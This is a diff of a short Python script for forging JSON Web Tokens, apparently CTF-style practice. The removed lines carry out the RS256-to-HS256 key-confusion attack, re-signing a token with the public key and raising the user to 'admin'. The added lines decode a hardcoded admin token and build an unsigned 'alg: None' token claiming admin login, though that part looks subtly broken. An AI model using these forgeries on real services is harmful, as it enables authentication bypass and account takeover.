@@ -1,39 +1,24 @@
-import hmac
-import hashlib
 import base64
-import binascii
 
-public_key = open('public.pem')
+jwt_token = "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhZG1pbiIsImlhdCI6MTY3MDY2MTM2OCwiZXhwIjoxNjcwNzQ3NzY4fQ.SY54XRpKXKvtuft5Q6terhLCk7YpT6JpfgAsA74ilMw"
 
-key = public_key.read()
-
-orig_jwt = "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ1c2VyIiwiaWF0IjoxNjcwMzE5MjUxLCJleHAiOjE2NzA0MDU2NTF9.xwDAH7TXh2gFHXNO10XpHesNB7RC3e_3vRG554w-4BI"
-
-particles = orig_jwt.split(".")
+particles = jwt_token.split(".")
 
 def padding(part):
     if len(part) % 4 != 0:
-        padding = 4- (len(part) % 4)
-        return part + ("="*padding)
+        padding = 4 - (len(part)%4)
+        return part + "=" * padding
     return part
 
-def sign(part, key):
-    return base64.urlsafe_b64encode(hmac.new(key.encode(), part.encode(), hashlib.sha256).digest()).decode("utf-8").rstrip("=")
+print("Algorithm Used:\t",base64.urlsafe_b64decode(padding(particles[0])))
+print("Body:\t", base64.urlsafe_b64decode(padding(particles[1])))
 
-header = base64.b64decode(padding(particles[0])).decode("utf-8")
-body = base64.b64decode(padding(particles[1])).decode("utf-8")
 
-header = header.replace("RS256","HS256")
-body = body.replace("poon","admin")
+def create_token():
+    jwt_header = base64.b64encode(b'{"alg":"None","typ":"JWS"}')
+    jwt_body = base64.b64encode(b'{"login":"admin","iat":"1588517209"}')
+    jwt_header = padding(jwt_header)
+    jwt_body = padding(jwt_body)
+    print(jwt_header.decode("utf-8") , "." , jwt_body.decode("utf-8") , ".")
 
-print(header)
-print(body)
-
-header = base64.urlsafe_b64encode(header.encode()).decode("utf-8").rstrip("=")
-body = base64.urlsafe_b64encode(body.encode()).decode("utf-8").rstrip("=")
-
-payload = header + "." + body
-print(payload)
-
-signature = sign(payload, key)
-print(payload + "." + signature)
+create_token()
